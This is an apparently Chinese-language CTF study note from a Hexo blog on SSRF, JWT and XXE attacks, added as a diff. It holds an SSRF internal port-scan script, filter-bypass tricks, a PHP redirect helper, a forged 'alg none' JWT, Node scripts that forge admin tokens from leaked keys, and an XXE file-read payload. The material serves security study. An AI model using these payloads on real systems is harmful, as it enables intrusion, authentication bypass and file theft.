@@ -1,0 +1,326 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Web_6_SSRF/JWT/XXE - Charmersix</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="第十一课 SSRF、JWT、XXE第一节 SSRF的漏洞利用0x1 ssrf原理解析什么是ssrf
+服务端请求伪造，攻击者向服务端发送包含恶意url链接的请求。ssrf常被用于探测攻击者无法访问的网,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Charmersix" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="Web_6_SSRF/JWT/XXE - Charmersix"/>
+    <meta name="twitter:description" content="第十一课 SSRF、JWT、XXE第一节 SSRF的漏洞利用0x1 ssrf原理解析什么是ssrf
+服务端请求伪造，攻击者向服务端发送包含恶意url链接的请求。ssrf常被用于探测攻击者无法访问的网,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Charmersix"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="Web_6_SSRF/JWT/XXE - Charmersix"/>
+    <meta property="og:description" content="第十一课 SSRF、JWT、XXE第一节 SSRF的漏洞利用0x1 ssrf原理解析什么是ssrf
+服务端请求伪造，攻击者向服务端发送包含恶意url链接的请求。ssrf常被用于探测攻击者无法访问的网,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Charmersix</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://charmersix.icu"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">Web_6_SSRF/JWT/XXE</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Web_6_SSRF/JWT/XXE</h1>
+        <div class="stuff">
+            <span>十月 20, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/JWT/" rel="tag">JWT</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Study/" rel="tag">Study</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/XXE/" rel="tag">XXE</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="第十一课-SSRF、JWT、XXE"><a href="#第十一课-SSRF、JWT、XXE" class="headerlink" title="第十一课 SSRF、JWT、XXE"></a>第十一课 SSRF、JWT、XXE</h1><h2 id="第一节-SSRF的漏洞利用"><a href="#第一节-SSRF的漏洞利用" class="headerlink" title="第一节 SSRF的漏洞利用"></a>第一节 SSRF的漏洞利用</h2><h3 id="0x1-ssrf原理解析"><a href="#0x1-ssrf原理解析" class="headerlink" title="0x1 ssrf原理解析"></a>0x1 ssrf原理解析</h3><h4 id="什么是ssrf"><a href="#什么是ssrf" class="headerlink" title="什么是ssrf"></a>什么是ssrf</h4><blockquote>
+<p>服务端请求伪造，攻击者向服务端发送包含恶意url链接的请求。ssrf常被用于探测攻击者无法访问的网络区域，比如内网或是防火墙访问限制的主机。</p>
+</blockquote>
+<p>控制服务器使用指定的协议(如http协议,file协议)</p>
+<h5 id="ssrf原理"><a href="#ssrf原理" class="headerlink" title="ssrf原理"></a>ssrf原理</h5><p>ssrf漏洞攻击的目标主机是从外网无法直接访问的内部系统</p>
+<p>服务端提供了从外部服务获取数据的功能，但没有对目标地址、协议等主要参数进行过滤和限制，从而导致攻击者可以自由构造参数，发起恶意请求</p>
+<p>正常访问逻辑如下图</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209231828260.png" alt="image-20220923182815181"></p>
+<h5 id="url结构"><a href="#url结构" class="headerlink" title="url结构"></a>url结构</h5><p>url结构遵循RFC1738标准，基本结构如下  </p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209221924251.png" alt="image-20220922192402191"></p>
+<h3 id="0x2-ssrf漏洞利用"><a href="#0x2-ssrf漏洞利用" class="headerlink" title="0x2 ssrf漏洞利用"></a>0x2 ssrf漏洞利用</h3><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p>file协议读取文件,但是前提是知道文件名</p>
+<h4 id="内网资源探测"><a href="#内网资源探测" class="headerlink" title="内网资源探测"></a>内网资源探测</h4><p>利用控制的<code>host</code>字段来扫描内网存活的主机</p>
+<p>监听分三钟</p>
+<ul>
+<li>127.0.0.1 只允许本地访问</li>
+<li>0.0.0.0 允许任意地址访问</li>
+<li>192.168.233.233 只允许特定IP访问</li>
+</ul>
+<p>这里可以写一个脚本帮我们探测内网网络端口</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;靶机&quot;</span></span><br><span class="line"></span><br><span class="line">ports = [<span class="number">80</span>,<span class="number">443</span>,<span class="number">8080</span>,<span class="number">80000</span>,<span class="number">9000</span>,<span class="number">21</span>,<span class="number">3306</span>,<span class="number">6379</span>,<span class="number">8088</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ports:</span><br><span class="line"></span><br><span class="line">  data = &#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>:<span class="string">&quot;http://127.0.0.1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(p)</span><br><span class="line">  &#125;</span><br><span class="line">  response = requests.post(url=url,data=data)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> response.text != <span class="string">&quot;&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;port: &#123;&#125; is open&quot;</span>.<span class="built_in">format</span>(p))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;port:&#123;&#125; is close&quot;</span>.<span class="built_in">format</span>(p))</span><br></pre></td></tr></table></figure>
+
+<h4 id="gopher协议扩展攻击面"><a href="#gopher协议扩展攻击面" class="headerlink" title="gopher协议扩展攻击面"></a>gopher协议扩展攻击面</h4><p><code>gopher://</code>负责转发的一个协议</p>
+<h5 id="攻击redis的6379端口"><a href="#攻击redis的6379端口" class="headerlink" title="攻击redis的6379端口"></a>攻击redis的6379端口</h5><p>redis是一个常用的缓存部件.一般运行在内网，使用者大多将其绑定在127.0.0.1:6397地址,且一般为空命令</p>
+<p>redis一条命令执行一个行为,一条是错的,下一条会继续执行</p>
+<p>如果我们能控制报文的任意一行,就可以实现攻击.</p>
+<p>这里我们可以使用Gopherus工具生成gopher协议打一下,这里要注意一下,在使用Gopherus时要记得二次url编码</p>
+<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209232157592.png" alt="image-20220923215702293" style="zoom:67%;" />
+
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209232157584.png" alt="image-20220923215747551"></p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209232159757.png" alt="image-20220923215904733"></p>
+<p>问题来了,这里为什么要进行二次编码呢?</p>
+<blockquote>
+<p>因为他进行了两次解码,我们在发送到redis要经过一个服务器的转发,比如这里是nginx转发,在我们传输到nginx时就进行了一次url解码,再发送给redis时,又进行了一次解码,所以我们要进行两次编码.</p>
+</blockquote>
+<h5 id="攻击MySQL的3306端口"><a href="#攻击MySQL的3306端口" class="headerlink" title="攻击MySQL的3306端口"></a>攻击MySQL的3306端口</h5><p>MySQL分为客户端和服务端,由客户端连接服务端有四种方式,分别是</p>
+<ul>
+<li>unix套接字</li>
+<li>内存共享</li>
+<li>命令管道</li>
+<li>TCP/IP套接字</li>
+</ul>
+<p>我们进行攻击依靠第四种方式,MySQL客户端连接时,有两种情况:</p>
+<ol>
+<li>需要密码认证,服务器先发送salt,客户端使用salt进行加密后再验证</li>
+<li>不需要密码认证,直接使用上边第四种方式发送数据包</li>
+</ol>
+<p>这里攻击MySQL要在非交互条件下进行,一定只能攻击没有密码的的MySQL服务端</p>
+<p>这里我们写马要用MySQL语句写</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209232233930.png" alt="image-20220923223307726"></p>
+<h5 id="攻击fastcgi的9000端口"><a href="#攻击fastcgi的9000端口" class="headerlink" title="攻击fastcgi的9000端口"></a>攻击fastcgi的9000端口</h5><blockquote>
+<p>php-fpm是个中间件,在需要PHP解释器来处理php文本时会用到php-fpm.</p>
+<p>自从PHP5.3以后将php-fpm继承到php内核种.php-fpm提供了更好的php进程管理方式,可以有效控制内存和进程,可以平滑重载php配置</p>
+</blockquote>
+<p>以我们经常执行访问的<code>index.php?file=/etc/passwd</code>为例:</p>
+<ol>
+<li><p>浏览器发送访问index.php的请求到web服务器,比如nginx/apache</p>
+</li>
+<li><p>web服务器将请求的uri(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行</p>
+</li>
+<li><p>php-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器</p>
+</li>
+<li><p>web服务器收到返回结果后,将http相应传给浏览器</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209251339303.png" alt="image-20220925133934213"></p>
+</li>
+</ol>
+<p>包含配置文件以后，后面紧跟一句</p>
+<p><code>fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name</code></p>
+<p>定义了一个<code>SCRIPT_FILENAME</code>,值是<code>$document_root$fastcgi_script_name</code></p>
+<p>重点看<code>SCRIPT_FILENAME</code>,这个就是nginx传给php-fpm的</p>
+<p>nginx和php-fpm的数据交互,使用的是fast-cgi协议</p>
+<h5 id="fastcgi协议"><a href="#fastcgi协议" class="headerlink" title="fastcgi协议"></a>fastcgi协议</h5><blockquote>
+<p>fastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器.</p>
+</blockquote>
+<p>可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件</p>
+<p>ssrf-&gt;控制服务端脚本请求本地php-fpm端口-&gt;伪造配置参数包含php://input数据-&gt;执行php://input内提交的代码</p>
+<p>这里还是使用gopherus</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209251615362.png" alt="image-20220925161538070"></p>
+<h3 id="0x3-ssrf的绕过"><a href="#0x3-ssrf的绕过" class="headerlink" title="0x3 ssrf的绕过"></a>0x3 ssrf的绕过</h3><h4 id="使用enclosed-alphanumerics绕过数字限制"><a href="#使用enclosed-alphanumerics绕过数字限制" class="headerlink" title="使用enclosed alphanumerics绕过数字限制"></a>使用<code>enclosed alphanumerics</code>绕过数字限制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
+
+<p>比如我们访问127.0.0.1,如果0被过滤了就可以使用127.⓿.⓿.1</p>
+<h4 id="IP地址进制绕过"><a href="#IP地址进制绕过" class="headerlink" title="IP地址进制绕过"></a>IP地址进制绕过</h4><p>IP地址可以转int也可以转不同进制来表示</p>
+<p>比如我们使用这个<a target="_blank" rel="noopener" href="http://www.tbfl.store/net/ip.html">http://www.tbfl.store/net/ip.html</a> 来转一下127.0.0.1</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209251642145.png" alt="image-20220925164246113"></p>
+<h4 id="特殊写法绕过"><a href="#特殊写法绕过" class="headerlink" title="特殊写法绕过"></a>特殊写法绕过</h4><p>IP地址有一些特殊的写法,在Windows下,0代表0.0.0.0,而在Linux下,0代表的是127.0.0.1</p>
+<p>所以,在某些情况下可以使用<a target="_blank" rel="noopener" href="http://0.0.0.0/">http://00</a> 请求127.0.0.1</p>
+<p>甚至我们可以将127.0.0.1中的0忽略掉,直接访问127.1代表127.0.0.1</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209251654930.png" alt="image-20220925164910688"></p>
+<p>Linux下也可以用中文句号代表点,<code>127。0。0。1</code>代表127.0.0.1</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209251654788.png" alt="image-20220925165450693"></p>
+<h4 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h4><p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可以跳转到内网中，比如302.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$schema</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$port</span>))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>/<span class="subst">$query</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$query</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器跟踪了location字段,就可以自动转向</p>
+<h4 id="短网址绕过"><a href="#短网址绕过" class="headerlink" title="短网址绕过"></a>短网址绕过</h4><p>网上有很多转换短网址的工具随便百度一个就有</p>
+<p>比如说<code>http://charmersix.icu/</code>转换成<code>http://jj6m.cn/e0fSu</code></p>
+<h2 id="第二节-JWT的原理以及突破"><a href="#第二节-JWT的原理以及突破" class="headerlink" title="第二节 JWT的原理以及突破"></a>第二节 JWT的原理以及突破</h2><h3 id="0x4-什么是jwt"><a href="#0x4-什么是jwt" class="headerlink" title="0x4 什么是jwt"></a>0x4 什么是jwt</h3><h4 id="jwt基本概念"><a href="#jwt基本概念" class="headerlink" title="jwt基本概念"></a>jwt基本概念</h4><p>json web token(jwt) 是一个轻量级的认证规范,这个规范允许使用jwt在用户和服务器之间传递安全可靠的信息.其本质是一个token,是一种紧凑的url安全方法,用于在网络通信的双方之间传递.</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209261855900.png" alt="900b3e81f832b2f08c2e8aabb540536a"></p>
+<p>我们可以进jwt官网看一下<code>jwt.io</code></p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209261948195.png" alt="image-20220926194846145"></p>
+<p>jwt明文只能看不能改</p>
+<h4 id="jwt使用"><a href="#jwt使用" class="headerlink" title="jwt使用"></a>jwt使用</h4><h4 id="jwt的漏洞"><a href="#jwt的漏洞" class="headerlink" title="jwt的漏洞"></a>jwt的漏洞</h4><h5 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a>空加密算法</h5><p>jwt支持空加密算法，可以在header中指定alg为none，这样的花，只要把signature设置为空，即不添加signature字段提交到服务器，任何token都可以通过服务器验证</p>
+<p>但是我们会发现官网是没法生成空加密的，但是我们知道它的signature是base64，所以我们直接手工生成</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;None&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;iss&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;iat&quot;: 1664193697,</span><br><span class="line">  &quot;exp&quot;: 1664200897,</span><br><span class="line">  &quot;nbf&quot;: 1664193697,</span><br><span class="line">  &quot;sub&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;jti&quot;: &quot;fa2fb0a80953bd65a5dfe2afec06048e&quot;</span><br><span class="line">&#125;</span><br><span class="line">在两段编码中间用.隔开</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209262008821.png" alt="image-20220926200852044"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY0MTkzNjk3LAogICJleHAiOiAxNjY0MjAwODk3LAogICJuYmYiOiAxNjY0MTkzNjk3LAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiZmEyZmIwYTgwOTUzYmQ2NWE1ZGZlMmFmZWMwNjA0OGUiCn0=.</span><br></pre></td></tr></table></figure>
+
+<p>(header+”.”+payload+”.”, 去掉了’.’signature字段)</p>
+<p>空加密算法是为了调试方便，在生产环境中开启空加密模式，缺少签名保护，攻击者只要把alg字段改成none，就可以在payload中构造身份，伪造用户身份。</p>
+<h5 id="密钥爆破"><a href="#密钥爆破" class="headerlink" title="密钥爆破"></a>密钥爆破</h5><p>我们可以使用<code>c-jwt-cracker-master</code>进行jwt密钥爆破</p>
+<h5 id="私钥泄露攻击"><a href="#私钥泄露攻击" class="headerlink" title="私钥泄露攻击"></a>私钥泄露攻击</h5><p>这里访问<code>/private.key</code>就能任意文件下载私钥，但是我们尝试在官网是无法生成的，但是我们可以自己写脚本生成</p>
+<p>这里就需要在本地安装node，然后<code>npm install jsonwebtoken</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;private.key&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> token =jwt.<span class="title function_">sign</span>(&#123;<span class="attr">user</span>:<span class="string">&#x27;admin&#x27;</span> &#125;,privateKey,&#123;<span class="attr">algorithm</span>:<span class="string">&#x27;RS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token);</span><br></pre></td></tr></table></figure>
+
+<p>然后写这么个脚本,生成</p>
+<h5 id="公钥泄露攻击"><a href="#公钥泄露攻击" class="headerlink" title="公钥泄露攻击"></a>公钥泄露攻击</h5><p>jwt中最常用的两种算法为HMAC和RSA</p>
+<p>HMAC是一种对称加密算法，使用相同的密钥进行加解密</p>
+<p>RSA是一种非对称加密算法，使用私钥加密，公钥解密</p>
+<p>在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token</p>
+<p>密钥一般情况下是无法获取的，但是可以获取到公钥，我们可以将加密算法RSA改成HAMC，即将alg字段由RS256改成HS256，同时使用获取到的公钥作为算法的密钥，对token进行签名提交给服务端.服务器会将RSA的公钥作为当前算法(HMAC)的密钥，HMAC公钥和密钥相同，使用HS256算法会对接收到的签名进行验证。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;public.key&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> token =jwt.<span class="title function_">sign</span>(&#123;<span class="attr">user</span>:<span class="string">&#x27;admin&#x27;</span> &#125;,privateKey,&#123;<span class="attr">algorithm</span>:<span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token);</span><br></pre></td></tr></table></figure>
+
+<p>但是这里要注意，我们在进行密钥攻击时，一定要用post方式<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209262229683.png" alt="307afa51c5111551e222c88701a2f22"></p>
+<h2 id="第三节-XXE文件读取"><a href="#第三节-XXE文件读取" class="headerlink" title="第三节　XXE文件读取"></a>第三节　XXE文件读取</h2><h3 id="0x5什么是xxe漏洞"><a href="#0x5什么是xxe漏洞" class="headerlink" title="0x5什么是xxe漏洞"></a>0x5什么是xxe漏洞</h3><h4 id="xxe的概念"><a href="#xxe的概念" class="headerlink" title="xxe的概念"></a>xxe的概念</h4><p>xxe是外部<code>XML Entity</code>实体注入,危害性较小</p>
+<p>xml定义了两种实体类型，分别是</p>
+<ul>
+<li>普通entity 在xml文档中使用</li>
+<li>参数entity 在dtd文档中使用</li>
+</ul>
+<h4 id="xxe危害"><a href="#xxe危害" class="headerlink" title="xxe危害"></a>xxe危害</h4><p>xxe利用，主流是读取文件为主，可以作为任意文件读取切入点</p>
+<h4 id="xxe利用"><a href="#xxe利用" class="headerlink" title="xxe利用"></a>xxe利用</h4><p>php中xxe的一般写法如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader <span class="comment">#禁用/启用加载外部实体的功能，参数为true时启用，参数为false时禁用</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>) <span class="comment">#接收POST请求方式传的数据</span></span><br><span class="line"><span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>,LIBXML_NOENT | LIBXML_DTDLOAD) <span class="comment">#通过解析一个xml标签字符串来组成该文档</span></span><br><span class="line"></span><br><span class="line">simplexml_import_dom <span class="comment">#把DOM节点转换为SimpleXMLElement对象</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$creds</span>-&gt;ctfshow <span class="comment">#获取页面中的ctfshow元素</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="有回显的情况"><a href="#有回显的情况" class="headerlink" title="有回显的情况"></a>有回显的情况</h5><p>这种情况我们可以直接用file协议读取文件</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;ctfshow&gt;</span><br><span class="line">&amp;xxe;</span><br><span class="line">&lt;/ctfshow&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="无回显情况"><a href="#无回显情况" class="headerlink" title="无回显情况"></a>无回显情况</h5><p>我们可以使用外部的DTD，通过一个公网ip进行读取</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="false"
+        data-ci="f71ceda7a670da0dc3de"
+        data-cs="8be3f3262b0ceccee081194200fa10dca1224f03"
+        data-r="blog_comments"
+        data-o="Charmersix"
+        data-a="Charmersix"
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
